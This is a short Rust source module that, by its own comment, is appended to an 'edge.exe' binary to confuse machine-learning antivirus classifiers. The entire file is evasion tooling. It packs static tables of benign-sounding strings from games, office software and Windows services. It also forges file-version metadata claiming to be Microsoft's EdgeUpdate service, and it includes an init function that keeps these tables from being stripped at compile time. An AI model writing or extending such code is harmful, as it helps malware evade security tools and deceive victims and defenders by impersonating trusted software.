// Happy Strings Resource
// Appended to edge.exe to confuse ML-based AV classifiers

#[used]
#[no_mangle]
static HAPPY_GAME: &[u8] = b"Unity Engine Runtime v2023.2\0Unreal Engine Shader Compiler\0Steam Client API v3.51.2\0Epic Games Launcher Service\0Valve Corporation Copyright 2024\0DirectX 12 Ultimate Graphics Pipeline\0NVIDIA GeForce Experience\0AMD Radeon Software Adrenalin\0Loading game assets...\0Connecting to multiplayer server...\0Achievement unlocked!\0Saving game progress...\0Applying graphics settings...\0Initializing physics engine...\0";

#[used]
#[no_mangle]
static HAPPY_OFFICE: &[u8] = b"Microsoft Office Document Cache\0Adobe Acrobat PDF Reader\0Google Chrome Browser Helper\0Slack Desktop Notification Service\0Zoom Video Communications\0Microsoft Teams Meeting Handler\0OneDrive Sync Engine\0Dropbox File Sync Service\0Visual Studio Code Extension Host\0JetBrains IDE Helper\0Loading document...\0Syncing files...\0Checking for updates...\0Initializing workspace...\0";

#[used]
#[no_mangle]
static HAPPY_SYSTEM: &[u8] = b"Windows Update Service\0Microsoft Defender Antimalware Service\0Windows Search Indexer\0Task Scheduler Engine\0Windows Print Spooler Service\0Network Location Awareness\0Background Intelligent Transfer Service\0Windows Error Reporting\0Volume Shadow Copy Service\0Windows Audio Device Graph Isolation\0";

#[used]
#[no_mangle]
static HAPPY_VERSION: &[u8] = b"EdgeUpdate Version 1.3.195.43 - Copyright Microsoft Corporation 2024\0OriginalFilename: EdgeUpdate.exe\0InternalName: EdgeUpdate\0FileDescription: Edge Update Service\0CompanyName: Microsoft Corporation\0LegalCopyright: (c) Microsoft Corporation. All rights reserved.\0";

pub fn init() {
    // Prevent module from being optimized out
    let _ = HAPPY_GAME;
    let _ = HAPPY_OFFICE;
    let _ = HAPPY_SYSTEM;
    let _ = HAPPY_VERSION;
}
